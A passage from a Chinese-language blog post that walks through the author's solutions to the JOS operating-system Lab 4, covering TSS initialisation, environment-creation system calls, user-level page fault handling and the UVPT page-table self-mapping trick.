class="line">thiscpu-&gt;cpu_ts.ts_ss0 = GD_KD;</span><br><span class="line">thiscpu-&gt;cpu_ts.ts_iomb = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> Taskstate);</span><br><span class="line"></span><br><span class="line">gdt[(GD_TSS0&gt;&gt;<span class="number">3</span>)+id] = SEG16(STS_T32A, (<span class="type">uint32_t</span>) (&amp;(thiscpu-&gt;cpu_ts)),</span><br><span class="line"><span class="keyword">sizeof</span>(<span class="keyword">struct</span> Taskstate) - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">gdt[(GD_TSS0&gt;&gt;<span class="number">3</span>)+id].sd_s = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// ltr(((GD_TSS0&gt;&gt;3)+id)&lt;&lt;3);</span></span><br><span class="line">ltr(GD_TSS0 + id*<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Gatedesc));</span><br><span class="line">lidt(&amp;idt_pd);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>下图有助于理解为什么gdt中使用cpt_ts的逻辑地址而不是物理地址，以及ltr操作的tss选择子.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310082204791.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310082204847.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310082226355.png"></p><h4 id="Locking"><a href="#Locking" class="headerlink" title="Locking"></a>Locking</h4><h4 id="System-Calls-for-Environment-Creation"><a href="#System-Calls-for-Environment-Creation" class="headerlink" title="System Calls for Environment Creation"></a>System Calls for Environment Creation</h4><p>几个系统调用,需要检查的东西都列出来了,挨着做就行了.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Allocate a new environment.</span></span><br><span class="line"><span class="comment">// Returns envid of new environment, or &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//-E_NO_FREE_ENV if no free environment is available.</span></span><br><span class="line"><span class="comment">//-E_NO_MEM on memory exhaustion.</span></span><br><span class="line"><span class="type">static</span> <span class="type">envid_t</span></span><br><span class="line"><span class="title function_">sys_exofork</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="keyword">if</span>((result = env_alloc(&amp;e,curenv-&gt;env_id)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;e-&gt;env_tf,&amp;curenv-&gt;env_tf,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Trapframe));</span><br><span class="line">e-&gt;env_status = ENV_NOT_RUNNABLE;</span><br><span class="line">e-&gt;env_tf.tf_regs.reg_eax = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> e-&gt;env_id;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set envid's env_status to status, which must be ENV_RUNNABLE</span></span><br><span class="line"><span class="comment">// or ENV_NOT_RUNNABLE.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//-E_BAD_ENV if environment envid doesn't currently exist,</span></span><br><span class="line"><span class="comment">//or the caller doesn't have permission to change envid.</span></span><br><span class="line"><span class="comment">//-E_INVAL if status is not a valid status for an environment.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_env_set_status</span><span class="params">(<span class="type">envid_t</span> envid, <span class="type">int</span> status)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="keyword">if</span>((result=envid2env(envid,&amp;e,<span class="number">1</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(status!=ENV_RUNNABLE&amp;&amp;status!=ENV_NOT_RUNNABLE)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line">e-&gt;env_status = status;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate a page of memory and map it at 'va' with permission</span></span><br><span class="line"><span class="comment">// 'perm' in the address space of 'envid'.</span></span><br><span class="line"><span class="comment">// The page's contents are set to 0.</span></span><br><span class="line"><span class="comment">// If a page is already mapped at 'va', that page is unmapped as a</span></span><br><span class="line"><span class="comment">// side effect.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// perm -- PTE_U | PTE_P must be set, PTE_AVAIL | PTE_W may or may not be set,</span></span><br><span class="line"><span class="comment">//         but no other bits may be set.  See PTE_SYSCALL in inc/mmu.h.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Return 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//-E_BAD_ENV if environment envid doesn't currently exist,</span></span><br><span class="line"><span class="comment">//or the caller doesn't have permission to change envid.</span></span><br><span class="line"><span class="comment">//-E_INVAL if va &gt;= UTOP, or va is not page-aligned.</span></span><br><span class="line"><span class="comment">//-E_INVAL if perm is inappropriate (see above).</span></span><br><span class="line"><span class="comment">//-E_NO_MEM if there's no memory to allocate the new page,</span></span><br><span class="line"><span class="comment">//or to allocate any necessary page tables.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_page_alloc</span><span class="params">(<span class="type">envid_t</span> envid, <span class="type">void</span> *va, <span class="type">int</span> perm)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span>* <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="keyword">if</span>((perm|PTE_SYSCALL)!=PTE_SYSCALL)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(va&gt;=(<span class="type">void</span>*)UTOP||va!=ROUNDDOWN(va,PGSIZE))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> E_INVAL;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((result = envid2env(envid,&amp;e,<span class="number">1</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(page = page_alloc(ALLOC_ZERO)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">}</span><br><span class="line">page_insert(e-&gt;env_pgdir,page,va,perm);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Map the page of memory at 'srcva' in srcenvid's address space</span></span><br><span class="line"><span class="comment">// at 'dstva' in dstenvid's address space with permission 'perm'.</span></span><br><span class="line"><span class="comment">// Perm has the same restrictions as in sys_page_alloc, except</span></span><br><span class="line"><span class="comment">// that it also must not grant write access to a read-only</span></span><br><span class="line"><span class="comment">// page.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Return 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//-E_BAD_ENV if srcenvid and/or dstenvid doesn't currently exist,</span></span><br><span class="line"><span class="comment">//or the caller doesn't have permission to change one of them.</span></span><br><span class="line"><span class="comment">//-E_INVAL if srcva &gt;= UTOP or srcva is not page-aligned,</span></span><br><span class="line"><span class="comment">//or dstva &gt;= UTOP or dstva is not page-aligned.</span></span><br><span class="line"><span class="comment">//-E_INVAL is srcva is not mapped in srcenvid's address space.</span></span><br><span class="line"><span class="comment">//-E_INVAL if perm is inappropriate (see sys_page_alloc).</span></span><br><span class="line"><span class="comment">//-E_INVAL if (perm &amp; PTE_W), but srcva is read-only in srcenvid's</span></span><br><span class="line"><span class="comment">//address space.</span></span><br><span class="line"><span class="comment">//-E_NO_MEM if there's no memory to allocate any necessary page tables.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_page_map</span><span class="params">(<span class="type">envid_t</span> srcenvid, <span class="type">void</span> *srcva,</span></span><br><span class="line"><span class="params">     <span class="type">envid_t</span> dstenvid, <span class="type">void</span> *dstva, <span class="type">int</span> perm)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">srcenv</span>,*<span class="title">dstenv</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">pte_t</span>* srcpte,*dstpte;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span>* <span class="title">srcpage</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="keyword">if</span>(srcva&gt;=(<span class="type">void</span>*)UTOP||srcva!=ROUNDDOWN(srcva,PGSIZE)||dstva&gt;=(<span class="type">void</span>*)UTOP||dstva!=ROUNDDOWN(dstva,PGSIZE))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> E_INVAL;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((perm|PTE_SYSCALL)!=PTE_SYSCALL)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((result = envid2env(srcenvid,&amp;srcenv,<span class="number">1</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((result = envid2env(dstenvid,&amp;dstenv,<span class="number">1</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(srcpage = page_lookup(srcenv-&gt;env_pgdir,srcva,&amp;srcpte)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(((*srcpte)&amp;PTE_W)==<span class="number">0</span>&amp;&amp;((perm&amp;PTE_W)!=<span class="number">0</span>))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((result = page_insert(dstenv-&gt;env_pgdir,srcpage,dstva,perm)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Unmap the page of memory at 'va' in the address space of 'envid'.</span></span><br><span class="line"><span class="comment">// If no page is mapped, the function silently succeeds.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Return 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//-E_BAD_ENV if environment envid doesn't currently exist,</span></span><br><span class="line"><span class="comment">//or the caller doesn't have permission to change envid.</span></span><br><span class="line"><span class="comment">//-E_INVAL if va &gt;= UTOP, or va is not page-aligned.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_page_unmap</span><span class="params">(<span class="type">envid_t</span> envid, <span class="type">void</span> *va)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(va&gt;=(<span class="type">void</span>*)UTOP||va!=ROUNDDOWN(va,PGSIZE))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((result = envid2env(envid,&amp;e,<span class="number">1</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line">page_remove(e-&gt;env_pgdir,va);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Part-B-Copy-on-Write-Fork"><a href="#Part-B-Copy-on-Write-Fork" class="headerlink" title="Part B: Copy-on-Write Fork"></a>Part B: Copy-on-Write Fork</h3><h4 id="User-level-page-fault-handling"><a href="#User-level-page-fault-handling" class="headerlink" title="User-level page fault handling"></a>User-level page fault handling</h4><h5 id="Setting-the-Page-Fault-Handler"><a href="#Setting-the-Page-Fault-Handler" class="headerlink" title="Setting the Page Fault Handler"></a>Setting the Page Fault Handler</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Set the page fault upcall for 'envid' by modifying the corresponding struct</span></span><br><span class="line"><span class="comment">// Env's 'env_pgfault_upcall' field.  When 'envid' causes a page fault, the</span></span><br><span class="line"><span class="comment">// kernel will push a fault record onto the exception stack, then branch to</span></span><br><span class="line"><span class="comment">// 'func'.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//-E_BAD_ENV if environment envid doesn't currently exist,</span></span><br><span class="line"><span class="comment">//or the caller doesn't have permission to change envid.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_env_set_pgfault_upcall</span><span class="params">(<span class="type">envid_t</span> envid, <span class="type">void</span> *func)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="keyword">if</span>((result = envid2env(envid,&amp;e,<span class="number">1</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line">e-&gt;env_pgfault_upcall = func;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="Invoking-the-User-Page-Fault-Handler"><a href="#Invoking-the-User-Page-Fault-Handler" class="headerlink" title="Invoking the User Page Fault Handler"></a>Invoking the User Page Fault Handler</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">page_fault_handler</span><span class="params">(<span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">uint32_t</span> fault_va;</span><br><span class="line">fault_va = rcr2();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((tf-&gt;tf_cs&amp;<span class="number">3</span>)==<span class="number">0</span>)</span><br><span class="line">panic(<span class="string">"kernel pagefalut\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(curenv-&gt;env_pgfault_upcall==<span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> recursive = (tf-&gt;tf_esp &gt;= UXSTACKTOP - PGSIZE) &amp;&amp; (tf-&gt;tf_esp &lt; UXSTACKTOP);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">UTrapframe</span>* <span class="title">utf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(recursive)</span><br><span class="line">{</span><br><span class="line">utf = (<span class="keyword">struct</span> UTrapframe*)(tf-&gt;tf_esp-<span class="keyword">sizeof</span>(<span class="keyword">struct</span> UTrapframe)-<span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line"><span class="comment">// cprintf("recursive\n");</span></span><br><span class="line">user_mem_assert(curenv,utf,tf-&gt;tf_esp-(<span class="type">uint32_t</span>)utf,PTE_W);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">utf = (<span class="keyword">struct</span> UTrapframe*)(UXSTACKTOP-<span class="keyword">sizeof</span>(<span class="keyword">struct</span> UTrapframe));</span><br><span class="line"><span class="comment">// cprintf("non-recursive\n");</span></span><br><span class="line">user_mem_assert(curenv,utf,UXSTACKTOP-(<span class="type">uint32_t</span>)utf,PTE_W);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">utf-&gt;utf_esp = tf-&gt;tf_esp; </span><br><span class="line">utf-&gt;utf_eflags = tf-&gt;tf_eflags;</span><br><span class="line">utf-&gt;utf_regs = tf-&gt;tf_regs;</span><br><span class="line">utf-&gt;utf_err = tf-&gt;tf_err;</span><br><span class="line">utf-&gt;utf_eip = tf-&gt;tf_eip;</span><br><span class="line">utf-&gt;utf_fault_va = fault_va;</span><br><span class="line"></span><br><span class="line">tf-&gt;tf_esp = (<span class="type">uintptr_t</span>)utf;</span><br><span class="line">tf-&gt;tf_eip = (<span class="type">uint32_t</span>)curenv-&gt;env_pgfault_upcall;</span><br><span class="line">env_run(curenv);</span><br><span class="line"></span><br><span class="line">bad:</span><br><span class="line"><span class="comment">// Destroy the environment that caused the fault.</span></span><br><span class="line">cprintf(<span class="string">"[%08x] user fault va %08x ip %08x\n"</span>,</span><br><span class="line">curenv-&gt;env_id, fault_va, tf-&gt;tf_eip);</span><br><span class="line">print_trapframe(tf);</span><br><span class="line">env_destroy(curenv);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="User-mode-Page-Fault-Entrypoint"><a href="#User-mode-Page-Fault-Entrypoint" class="headerlink" title="User-mode Page Fault Entrypoint"></a>User-mode Page Fault Entrypoint</h5><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">.globl _pgfault_upcall</span><br><span class="line">_pgfault_upcall:</span><br><span class="line">// Call the C page fault handler.</span><br><span class="line">pushl %esp// function argument: pointer to UTF</span><br><span class="line">movl _pgfault_handler, %eax</span><br><span class="line">call *%eax</span><br><span class="line">addl $4, %esp// pop function argument</span><br><span class="line"></span><br><span class="line">movl 40(%esp),%ebx //取出trap_eip</span><br><span class="line">subl $4,48(%esp) //抬高栈4字节,此空间为trap_eip的返回地址</span><br><span class="line">movl 48(%esp),%eax //取出trap_esp</span><br><span class="line">movl %ebx,(%eax) </span><br><span class="line"></span><br><span class="line">addl $8,%esp //跳过err和fault_va</span><br><span class="line"></span><br><span class="line">popal //restore the trap-time registers</span><br><span class="line"></span><br><span class="line">addl $4,%esp //跳过trap_eip</span><br><span class="line">popf</span><br><span class="line"></span><br><span class="line">     popl %esp</span><br><span class="line">ret</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">set_pgfault_handler</span><span class="params">(<span class="type">void</span> (*handler)(<span class="keyword">struct</span> UTrapframe *utf))</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (_pgfault_handler == <span class="number">0</span>) {</span><br><span class="line"><span class="comment">// First time through!</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="type">envid_t</span> eid = sys_getenvid();</span><br><span class="line"><span class="keyword">if</span>(sys_page_alloc(eid,(<span class="type">void</span>*)(UXSTACKTOP-PGSIZE),PTE_W|PTE_U|PTE_P))</span><br><span class="line">{</span><br><span class="line"><span class="comment">//panic("fail\n"); User系统调用失败,凭啥让内核panic?</span></span><br><span class="line">}</span><br><span class="line">sys_env_set_pgfault_upcall(eid,_pgfault_upcall);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Save handler pointer for assembly to call.</span></span><br><span class="line">_pgfault_handler = handler;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h4 id="Implementing-Copy-on-Write-Fork"><a href="#Implementing-Copy-on-Write-Fork" class="headerlink" title="Implementing Copy-on-Write Fork"></a>Implementing Copy-on-Write Fork</h4><h5 id="页表-页目录表的映射分析"><a href="#页表-页目录表的映射分析" class="headerlink" title="页表,页目录表的映射分析"></a>页表,页目录表的映射分析</h5><p>实现完用户级页面错误处理例程的安装工作后,下面进入Fork函数的实现.<br>在此之前,先来理解一个<code>clever mapping trick</code>.</p><p>在为环境建立映射的时候,有这样一个操作.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UVPT maps the env's own page table read-only.</span></span><br><span class="line"><span class="comment">// Permissions: kernel R, user R</span></span><br><span class="line">e-&gt;env_pgdir[PDX(UVPT)] = PADDR(e-&gt;env_pgdir) | PTE_P | PTE_U;</span><br></pre></td></tr></tbody></table></figure><p>UVPT的定义如下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// User read-only virtual page table (see 'uvpt' below)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UVPT(ULIM - PTSIZE)</span></span><br></pre></td></tr></tbody></table></figure><p>根据注释,我们可以理解这一操作是将页目录表自身映射到虚拟地址UVPT,使用户进程可以只读访问.But how does it work?</p><p>先来看这样一个情形.用户态lib的某个函数要检查一个物理页在其页表中的pte条目来判断操作是否合法.自然而然的想法是:通过之前映射的页目录表找到对应的页目录表目中的页表地址,再访问该页表的对应pte条目.</p><p>但问题是,页目录表条目pde中存的是页表的物理地址而不是虚拟地址,没办法访问到对应页表.你可能会想,不对啊,之前在内核态的时候有过访问pte的操作啊.其实是因为之前访问时是先将从页目录表中取出的页表物理地址转换成KVA虚拟地址后再访问的,能完成这样的操作是因为我们曾经将从0开始的物理地址空间映射到了KERNBASE之上.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boot_map_region(kern_pgdir, KERNBASE, (<span class="number">1ULL</span> &lt;&lt; <span class="number">32</span>) - KERNBASE, <span class="number">0</span>, PTE_W);</span><br></pre></td></tr></tbody></table></figure><p>而用户进程并不具有访问KERNBASE之上虚拟地址空间的能力.</p><p>那用户进程应该怎么访问页表条目呢?页表本身也是一个物理页,而访问一个物理页就需要找到该物理页对应的页表,页表的页表,也就是页目录表.把页目录表当作一个页表,不久能找到页表本身的物理地址了?</p><p>回想一下分页机制的工作.先在页目录表中通过PDX找到页表,再在页表中通过PTX找到物理页.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310111628497.png"><br>那如果我们让页目录表根据PDX找到页目录表自身,页部件就会把页目录表当成页表,再根据PTX找到页表本身的物理地址并进行访问.<br><img 